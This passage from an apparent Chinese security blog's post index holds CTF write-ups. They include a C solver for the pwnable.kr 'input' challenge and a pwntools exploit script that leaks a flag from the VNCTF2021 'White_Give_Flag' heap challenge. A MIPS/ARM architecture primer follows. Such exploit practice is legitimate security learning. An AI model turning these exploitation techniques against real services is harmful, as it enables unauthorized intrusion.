class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> pipe_stdin[<span class="number">2</span>] = &#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;, pipe_stderr[<span class="number">2</span>] = &#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">  <span class="keyword">char</span> *argv[<span class="number">101</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="comment">/* stage 3 */</span></span><br><span class="line">  <span class="keyword">char</span> *envp[<span class="number">2</span>] = &#123;<span class="string">"\xde\xad\xbe\xef=\xca\xfe\xba\xbe"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">  FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">pid_t</span> pid_child;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* stage 1 */</span></span><br><span class="line">  argv[<span class="number">0</span>] = <span class="string">"/home/input2/input"</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    argv[i] = <span class="string">"a"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  argv[<span class="string">'A'</span>] = <span class="string">"\x00"</span>;</span><br><span class="line">  argv[<span class="string">'B'</span>] = <span class="string">"\x20\x0a\x0d"</span>;</span><br><span class="line">  argv[<span class="string">'C'</span>] = <span class="string">"55555"</span>;</span><br><span class="line">  argv[<span class="number">100</span>] = <span class="literal">NULL</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* stage 4 */</span></span><br><span class="line">  fp = fopen(<span class="string">"\x0a"</span>,<span class="string">"wb"</span>);</span><br><span class="line">  <span class="keyword">if</span>(!fp)</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"Cannot open file."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fwrite(<span class="string">"\x00\x00\x00\x00"</span>,<span class="number">4</span>,<span class="number">1</span>,fp);</span><br><span class="line">  fclose(fp);</span><br><span class="line">  fp = <span class="literal">NULL</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* stage 2 */</span></span><br><span class="line">  <span class="keyword">if</span>(pipe(pipe_stdin) &lt; <span class="number">0</span> || pipe(pipe_stderr) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"Cannot create pipe!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>((pid_child = fork()) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"Cannot create child process!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(pid_child == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//子进程先等待父进程重定向pipe read，然后关闭不使用的pipe read</span></span><br><span class="line">    <span class="comment">//继而向两个pipe write对应的字符串，父进程此时已经把pipe read重定向到stdin和stderr</span></span><br><span class="line">    <span class="comment">//最终由input程序接收</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">close</span>(pipe_stdin[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">close</span>(pipe_stderr[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">write</span>(pipe_stdin[<span class="number">1</span>], <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">write</span>(pipe_stderr[<span class="number">1</span>], <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//父进程无需pipe write操作，首先close掉，然后把两个pipe read重定向到0和2</span></span><br><span class="line">    <span class="comment">//也就是stdin和stderr</span></span><br><span class="line">    <span class="built_in">close</span>(pipe_stdin[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">close</span>(pipe_stderr[<span class="number">1</span>]);</span><br><span class="line">    dup2(pipe_stdin[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">    dup2(pipe_stderr[<span class="number">0</span>], <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    execve(<span class="string">"/home/input2/input"</span>, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* stage 5 */</span></span><br><span class="line">  sleep(<span class="number">5</span>);</span><br><span class="line">  <span class="keyword">int</span> sockfd;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>;</span></span><br><span class="line">  sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span>(sockfd == <span class="number">-1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"Cannot create socket!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  saddr.sin_family = AF_INET;</span><br><span class="line">  saddr.sin_addr.s_addr = inet_addr(<span class="string">"127.0.0.1"</span>);</span><br><span class="line">  saddr.sin_port = htons(<span class="number">55555</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">connect</span>(sockfd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"Cannot connect to server!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">write</span>(sockfd, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">close</span>(sockfd);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在/tmp下建一个我们的目录input，编写test.c并<code>gcc test.c -o test</code>编译，注意该目录下没有flag，所以要先通过<code>ln -s /home/input2/flag flag</code>来建一个软链接。</p><p>之所以新建目录而不是在tmp下操作是因为tmp目录我们本身也没有权限，这会限制最后一步的system(“/bin/cat flag”)。</p><p>ps：草tmp目录和input目录下全是大家的文件，亏tmp目录还特意限制了ls</p><p>参考：</p><ul><li><a href="https://r00tk1ts.github.io/2018/03/05/random/" target="_blank" rel="noopener">Writeup.pwnable.kr系列之random</a></li><li><a href="https://r00tk1ts.github.io/2018/03/06/input/" target="_blank" rel="noopener">Writeup.pwnable.kr系列之input</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vnctf2021-White_Give_Flag</title>
      <link href="2021/04/18/vnctf2021-White-Give-Flag/"/>
      <url>2021/04/18/vnctf2021-White-Give-Flag/</url>
      
        <content type="html"><![CDATA[<p>例行检查，保护全开，且没给libc</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>一进去就是一个意义不明的函数，我们先不管它</p><p>然后就是正常的菜单题，比较诡异的是choice的选择返回值并不是atoi的，而是read的返回值，add可以添加四个块，show输出一个意义不明的随机数，del和edit也都正常，没有什么问题，现在看起来正常思路就没有了，只能去看看那个意义不明的函数</p><p>发现进行了一堆意义不明的malloc，但是最后一次会把flag写入chunk且并没有清零</p><p>写到这里我直接震惊，为什么别人的ida和我的不一样，我咋死活看不出来chunk大小</p><p>这是我的：</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/vn2021-white-1.png"  alt=""></p><p>别人的：</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/vn2021-white-2.png"  alt=""></p><p>行吧。</p><p>简而言之，这里是一个[0x300, 0x500]范围内随机大小的chunk，而我们只需要申请这个大小中的chunk，就有可能申请到里面含有flag的chunk，那么如何泄露出来呢？</p><p>是靠choice的返回值，它的返回值和read相关，我们只需要使read的返回值是0，就可以访问到qword_202120[ - 1]，正好是我们的第四个chunk，我们再把大小为0x10的chunk头部给填充掉，即可获得flag。</p><p>ps：pwntools 可以使用 shutdown_raw(‘send’) 关闭管道的 send 方向，使远程 read() 读到 EOF，返回 0。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(choice)</span>:</span></span><br><span class="line">io.recvuntil(<span class="string">'choice:'</span>) </span><br><span class="line">io.sendline(choice)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">menu(<span class="string">''</span>)</span><br><span class="line">io.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">io.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">menu(<span class="string">'123'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">io.sendline(str(index))</span><br><span class="line">io.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">io.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span> :</span><br><span class="line">io = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">39123</span>)</span><br><span class="line"><span class="comment">#io = process("./attachment")</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x310</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">'x'</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'choice:'</span>) </span><br><span class="line">io.shutdown_raw(<span class="string">'send'</span>)</span><br><span class="line">io.recvuntil(<span class="string">b'x'</span>*<span class="number">0x10</span>)</span><br><span class="line">flag = io.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">b'ctf'</span> <span class="keyword">in</span> flag:</span><br><span class="line">print(flag)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mips/arm架构简述</title>
      <link href="2021/03/30/mips-arm%E6%9E%B6%E6%9E%84%E7%AE%80%E8%BF%B0/"/>
      <url>2021/03/30/mips-arm%E6%9E%B6%E6%9E%84%E7%AE%80%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="MIPS架构简介"><a href="#MIPS架构简介" class="headerlink" title="MIPS架构简介"></a>MIPS架构简介</h1><p>MIPS架构是一种采取精简指令集（RISC）的处理器架构</p><ul><li>MIPS和MIPSEL是两种架构MIPS是大端序、MIPSEL是小端序。一般来说大端序列是主流的（和x86和arm相反），不过很多CTF题目都是小端序的。（大端调试需要在gdb和pwntools都特别设置，否则默认小端）</li><li>不支持NX（即使编译选项添加了也没有用）不支持NX即函数的栈/bss都是可执行的，当我们的写入栈中的shellcode能够被执行，大大降低了利用难度。</li><li>叶子函数和非叶子函数<ul><li>在MIPS体系架构下，函数分为叶子函数和非叶子函数。MIPS函数的调用过程与x86不同，x86中函数A调用函数B时，会将A函数的地址压入堆栈中，等到函数B执行完毕返回A函数时候，再从堆栈中弹出函数A的地址。而MIPS中，如果是<strong>叶子函数</strong>，与x86是不同的，函数的返回地址是不会压入栈中的，而是会直接存入寄存器<strong>$ra</strong>中。如果是<strong>非叶子函数（即函数中还调用了其他函数）</strong>，则和x86类似，将地址存入栈中。</li><li>另外Mips是没有栈底指针的，只有一个<strong><code>$</code>sp</strong>指向栈顶，并且不会像x86那样通过pop或者push调整指针，而是采用<strong>偏移寻址</strong>来访问变量。非叶子函数如图所示，在函数头部会将调用函数的返回地址即<strong>$ra</strong>存放在栈底（偏移4字节），而在函数快结束时会重新将该值取去出来，放入ra。在这个间段内，如果覆盖了函数栈底，就能够控制程序的流程。</li></ul></li></ul><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>MIPS 架构中共包含 32 个通用寄存器：</p><table><thead><tr><th>REGISTER</th><th>NAME</th><th>USAGE</th></tr></thead><tbody><tr><td><code>$0</code></td><td><code>$zero</code></td><td>常量0(constant value 0)</td></tr><tr><td><code>$1</code></td><td><code>$at</code></td><td>保留给汇编器(Reserved for assembler)</td></tr><tr><td><code>$2-$3</code></td><td><code>$v0-$v1</code></td><td>函数调用返回值(values for results and expression evaluation)</td></tr><tr><td><code>$4-$7</code></td><td><code>$a0-$a3</code></td><td>函数调用参数(arguments)</td></tr><tr><td><code>$8-$15</code></td><td><code>$t0-$t7</code></td><td>暂时的(或随便用的)</td></tr><tr><td><code>$16-$23</code></td><td><code>$s0-$s7</code></td><td>保存的(或如果用，需要SAVE/RESTORE的)(saved)</td></tr><tr><td><code>$24-$25</code></td><td><code>$t8-$t9</code></td><td>暂时的(或随便用的)</td></tr><tr><td><code>$28</code></td><td><code>$gp</code></td><td>全局指针(Global Pointer)</td></tr><tr><td><code>$29</code></td><td><code>$sp</code></td><td>堆栈指针(Stack Pointer)</td></tr><tr><td><code>$30</code></td><td><code>$fp</code></td><td>帧指针(Frame Pointer)</td></tr><tr><td><code>$31</code></td><td><code>$ra</code></td><td>返回地址(return address)</td></tr></tbody></table><p>MIPS32架构中定义了3个特殊寄存器。分别为PC（程序计数器）、HI(乘除结果高位寄存器）和LO(乘除结果低位寄存器）。在进行乘法运算时，HI和LO保存乘法的运算结果，其中HI存储高32位，LO存储低32位；而在进行除法运算时，HI保存余数，LO存储商。</p><h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><table><thead><tr><th>指令</th><th>功能</th><th>应用实例</th></tr></thead><tbody><tr><td>LB</td><td>从存储器中读取一个字节的数据到寄存器中</td><td>LB R1, 0(R2)</td></tr><tr><td>LH</td><td>从存储器中读取半个字的数据到寄存器中</td><td>LH R1, 0(R2)</td></tr><tr><td>LW</td><td>从存储器中读取一个字的数据到寄存器中</td><td>LW R1, 0(R2)</td></tr><tr><td>LD</td><td>从存储器中读取双字的数据到寄存器中</td><td>LD R1, 0(R2)</td></tr><tr><td>L.S</td><td>从存储器中读取单精度浮点数到寄存器中</td><td>L.S R1, 0(R2)</td></tr><tr><td>L.D</td><td>从存储器中读取双精度浮点数到寄存器中</td><td>L.D R1, 0(R2)</td></tr><tr><td>LBU</td><td>功能与LB指令相同，但读出的是不带符号的数据</td><td>LBU R1, 0(R2)</td></tr><tr><td>LHU</td><td>功能与LH指令相同，但读出的是不带符号的数据</td><td>LHU R1, 0(R2)</td></tr><tr><td>LWU</td><td>功能与LW指令相同，但读出的是不带符号的数据</td><td>LWU R1, 0(R2)</td></tr><tr><td>SB</td><td>把一个字节的数据从寄存器存储到存储器中</td><td>SB R1, 0(R2)</td></tr><tr><td>SH</td><td>把半个字节的数据从寄存器存储到存储器中</td><td>SH R1，0(R2)</td></tr><tr><td>SW</td><td>把一个字的数据从寄存器存储到存储器中</td><td>SW R1, 0(R2)</td></tr><tr><td>SD</td><td>把两个字节的数据从寄存器存储到存储器中</td><td>SD R1, 0(R2)</td></tr><tr><td>S.S</td><td>把单精度浮点数从寄存器存储到存储器中</td><td>S.S R1, 0(R2)</td></tr><tr><td>S.D</td><td>把双精度数据从存储器存储到存储器中</td><td>S.D R1, 0(R2)</td></tr><tr><td>DADD</td><td>把两个定点寄存器的内容相加，也就是定点加</td><td>DADD R1,R2,R3</td></tr><tr><td>DADDI</td><td>把一个寄存器的内容加上一个立即数</td><td>DADDI R1,R2,#3</td></tr><tr><td>DADDU</td><td>不带符号的加</td><td>DADDU R1,R2,R3</td></tr><tr><td>DADDIU</td><td>把一个寄存器的内容加上一个无符号的立即数</td><td>DADDIU R1,R2,#3</td></tr><tr><td>ADD.S</td><td>把一个单精度浮点数加上一个双精度浮点数，结果是单精度浮点数</td><td>ADD.S F0,F1,F2</td></tr><tr><td>ADD.D</td><td>把一个双精度浮点数加上一个单精度浮点数，结果是双精度浮点数</td><td>ADD.D F0,F1,F2</td></tr><tr><td>ADD.PS</td><td>两个单精度浮点数相加，结果是单精度浮点数</td><td>ADD.PS F0,F1,F2</td></tr><tr><td>DSUB</td><td>两个寄存器的内容相减，也就是定点数的减</td><td>DSUB R1,R2,R3</td></tr><tr><td>DSUBU</td><td>不带符号的减</td><td>DSUBU R1,R2,R3</td></tr><tr><td>SUB.S</td><td>一个双精度浮点数减去一个单精度浮点数，结果为单精度</td><td>SUB.S F1,F2,F3</td></tr><tr><td>SUB.D</td><td>一个双精度浮点数减去一个单精度浮点数，结果为双精度浮点数</td><td>SUB.D F1,F2,F3</td></tr><tr><td>SUB.PS</td><td>两个单精度浮点数相减</td><td>SUB.SP F1,F2,F3</td></tr><tr><td>DDIV</td><td>两个定点寄存器的内容相除，也就是定点除</td><td>DDIV Ｒ1,Ｒ2,Ｒ3</td></tr><tr><td>DDIVU</td><td>不带符号的除法运算</td><td>DDIVU Ｒ1,Ｒ2,Ｒ3</td></tr><tr><td>DIV.S</td><td>一个双精度浮点数除以一个单精度浮点数，结果为单精度浮点数</td><td>DIV.S F1,F2,F3</td></tr><tr><td>DIV.D</td><td>一个双精度浮点数除以一个单精度浮点数，结果为双精度浮点数</td><td>DIV.D F1,F2,F3</td></tr><tr><td>DIV.PS</td><td>两个单精度浮点数相除，结果为单精度</td><td>DIV.PS F1,F2,F3</td></tr><tr><td>DMUL</td><td>两个定点寄存器的内容相乘，也就是定点乘</td><td>DMUL Ｒ1,Ｒ2,Ｒ3</td></tr><tr><td>DMULU</td><td>不带符号的乘法运算</td><td>DMULU R1,R2,R3</td></tr><tr><td>MUL.S</td><td>一个双精度浮点数乘以一个单精度浮点数，结果为单精度浮点数</td><td>DMUL.S F1,F2,F3</td></tr><tr><td>MUL.D</td><td>一个双精度浮点数乘以一个单精度浮点数，结果为双精度浮点数</td><td>DMUL.D F1,F2,F3</td></tr><tr><td>MUL.PS</td><td>两个单精度浮点数相乘，结果为单精度浮点数</td><td>DMUL.PS F1,F2,F3</td></tr><tr><td>AND</td><td>与运算，两个寄存器中的内容相与</td><td>ANDＲ1,Ｒ2,Ｒ3</td></tr><tr><td>ANDI</td><td>一个寄存器中的内容与一个立即数相与</td><td>ANDIＲ1,Ｒ2,#3</td></tr><tr><td>OR</td><td>或运算，两个寄存器中的内容相或</td><td>ORＲ1,Ｒ2,Ｒ3</td></tr><tr><td>ORI</td><td>一个寄存器中的内容与一个立即数相或</td><td>ORIＲ1,Ｒ2,#3</td></tr><tr><td>XOR</td><td>异或运算，两个寄存器中的内容相异或</td><td>XORＲ1,Ｒ2,Ｒ3</td></tr><tr><td>XORI</td><td>一个寄存器中的内容与一个立即数异或</td><td>XORIＲ1,Ｒ2,#3</td></tr><tr><td>BEQZ</td><td>条件转移指令，当寄存器中内容为0时转移发生</td><td>BEQZ R1,0</td></tr><tr><td>BENZ</td><td>条件转移指令，当寄存器中内容不为0时转移发生</td><td>BNEZ R1,0</td></tr><tr><td>BEQ</td><td>条件转移指令，当两个寄存器内容相等时转移发生</td><td>BEQ R1,R2</td></tr><tr><td>BNE</td><td>条件转移指令，当两个寄存器中内容不等时转移发生</td><td>BNE R1,R2</td></tr><tr><td>J</td><td>直接跳转指令，跳转的地址在指令中</td><td>J name</td></tr><tr><td>JR</td><td>使用寄存器的跳转指令，跳转地址在寄存器中</td><td>JR R1</td></tr><tr><td>JAL</td><td>直接跳转指令，并带有链接功能，指令的跳转地址在指令中，跳转发生时要把返回地址存放到R31这个寄存器中</td><td>JAL R1 name</td></tr><tr><td>JALR</td><td>使用寄存器的跳转指令，并且带有链接功能，指令的跳转地址在寄存器中，跳转发生时指令的放回地址放在R31这个寄存器中</td><td>JALR R1</td></tr><tr><td>MOV.S</td><td>把一个单精度浮点数从一个浮点寄存器复制到另一个浮点寄存器</td><td>MOV.S F0,F1</td></tr><tr><td>MOV.D</td><td>把一个双精度浮点数从一个浮点寄存器复制到另一个浮点寄存器</td><td>MOV.D F0,F1</td></tr><tr><td>MFC0</td><td>把一个数据从通用寄存器复制到特殊寄存器</td><td>MFC0 R1,R2</td></tr><tr><td>MTC0</td><td>把一个数据从特殊寄存器复制到通用寄存器</td><td>MTC0 R1,R2</td></tr><tr><td>MFC1</td><td>把一个数据从定点寄存器复制到浮点寄存器</td><td>MFC1 R1,F1</td></tr><tr><td>MTC1</td><td>把一个数据从浮点寄存器复制到定点寄存器</td><td>MTC1 R1,F1</td></tr><tr><td>LUI</td><td>把一个16位的立即数填入到寄存器的高16位，低16位补零</td><td>LUI R1,#42</td></tr><tr><td>DSLL</td><td>双字逻辑左移</td><td>DSLL R1,R2,#2</td></tr><tr><td>DSRL</td><td>双字逻辑右移</td><td>DSRL R1,R2,#2</td></tr><tr><td>DSRA</td><td>双字算术右移</td><td>DSRA R1,R2,#2</td></tr><tr><td>DSLLV</td><td>可变的双字逻辑左移</td><td>DSLLV R1,R2,#2</td></tr><tr><td>DSRLV</td><td>可变的双字罗伊右移</td><td>DSRLV R1,R2,#2</td></tr><tr><td>DSRAV</td><td>可变的双字算术右移</td><td>DSRAV R1,R2,#2</td></tr><tr><td>SLT</td><td>如果R2的值小于R3，那么设置R1的值为1，否则设置R1的值为0</td><td>SLT R1,R2,R3</td></tr><tr><td>SLTI</td><td>如果寄存器R2的值小于立即数，那么设置R1的值为1，否则设置寄存器R1的值为0</td><td>SLTI R1,R2,#23</td></tr><tr><td>SLTU</td><td>功能与SLT一致，但是带符号的</td><td>SLTU R1,R2,R3</td></tr><tr><td>SLTUI</td><td>功能与SLT一致，但不带符号</td><td>SLTUI R1,R2,R3</td></tr><tr><td>MOVN</td><td>如果第三个寄存器的内容为负，那么复制一个寄存器的内容到另外一个寄存器</td><td>MOVN R1,R2,R3</td></tr><tr><td>MOVZ</td><td>如果第三个寄存器的内容为0，那么复制一个寄存器的内容到另外一个寄存器</td><td>MOVZ R1,R2,R3</td></tr><tr><td>TRAP</td><td>根据地址向量转入管态</td><td></td></tr><tr><td>ERET</td><td>从异常中返回到用户态</td><td></td></tr><tr><td>MADD.S</td><td>一个双精度浮点数与单精度浮点数相乘加，结果为单精度</td><td></td></tr><tr><td>MADD.D</td><td>一个双精度浮点数与单精度浮点数相乘加，结果为双精度</td><td></td></tr><tr><td>MADD.PS</td><td>两个单精度浮点数相乘加，结果为单精度</td><td></td></tr></tbody></table><h1 id="ARM架构简介"><a href="#ARM架构简介" class="headerlink" title="ARM架构简介"></a>ARM架构简介</h1><p>ARM架构使用了与Intel/AMD架构所不同的精简指令集(RISC)。</p><h2 id="寄存器-1"><a href="#寄存器-1" class="headerlink" title="寄存器"></a>寄存器</h2><ol><li>子程序间通过寄存器<strong>R0～R3</strong>来<strong>传递参数</strong>。这时，寄存器R0～R3可记作arg0～arg3。<strong>被调用的子程序在返回前无需恢复寄存器R0～R3的内容，R0被用来存储函数调用的返回值</strong>。</li><li>在子程序中，使用寄存器<strong>R4～R11</strong>来<strong>保存局部变量</strong>。这时，寄存器R4～R11可以记作var1～var8。如果在子程序中使用了寄存器v1～v8中的某些寄存器，则<strong>子程序进入时必须保存这些寄存器的值，在返回前必须恢复这些寄存器的值</strong>。<strong>R7经常被用作存储系统调用号，R11存放着帮助我们找到栈帧边界的指针，记作FP</strong>。在Thumb程序中，通常只能使用寄存器R4～R7来保存局部变量。</li><li>寄存器<strong>R12</strong>用作<strong>过程调用中间临时寄存器</strong>，记作IP。在子程序之间的连接代码段中常常有这种使用规则。</li><li>寄存器<strong>R13</strong>用作<strong>堆栈指针</strong>，记作SP。在子程序中寄存器R13不能用作其他用途。<strong>寄存器SP在进入子程序时的值和退出子程序时的值必须相等</strong>。</li><li>寄存器<strong>R14</strong>称为<strong>连接寄存器</strong>，记作LR。它用于<strong>保存子程序的返回地址</strong>。如果在子程序中保存了返回地址，寄存器R14则可以用作其他用途。</li><li>寄存器<strong>R15</strong>是<strong>程序计数器</strong>，记作PC。它不能用作其它用途。当执行一个分支指令时，<strong>PC存储目的地址。在程序执行中，ARM模式下的PC存储着当前指令加8(两条ARM指令后)的位置，Thumb(v1)模式下的PC存储着当前指令加4(两条Thumb指令后)的位置</strong>。</li></ol><p>ARM与Intel寄存器对比：</p><table><thead><tr><th align="center">ARM架构 寄存器名</th><th align="center">寄存器描述</th><th align="center">Intel架构 寄存器名</th></tr></thead><tbody><tr><td align="center">R0</td><td align="center">通用寄存器</td><td align="center">EAX</td></tr><tr><td align="center">R1~R5</td><td align="center">通用寄存器</td><td align="center">EBX、ECX、EDX、EDI、ESI</td></tr><tr><td align="center">R6~R10</td><td align="center">通用寄存器</td><td align="center">无</td></tr><tr><td align="center">R11(FP)</td><td align="center">栈帧指针</td><td align="center">EBP</td></tr><tr><td align="center">R12(IP)</td><td align="center">内部程序调用</td><td align="center">无</td></tr><tr><td align="center">R13(SP)</td><td align="center">堆栈指针</td><td align="center">ESP</td></tr><tr><td align="center">R14(LP)</td><td align="center">链接寄存器</td><td align="center">无</td></tr><tr><td align="center">R15(PC)</td><td align="center">程序计数器</td><td align="center">EIP</td></tr><tr><td align="center">CPSR</td><td align="center">程序状态寄存器</td><td align="center">EFLAGS</td></tr></tbody></table><h2 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h2><p>参见<a href="https://blog.csdn.net/qq_40531974/article/details/83897559" target="_blank" rel="noopener">ARM汇编指令集汇总</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOT </tag>
            
            <tag> pwn </tag>
            
            <tag> arm </tag>
            
            <tag> mips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>群晖NAS环境搭建</title>
      <link href="2021/02/03/%E7%BE%A4%E6%99%96NAS%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
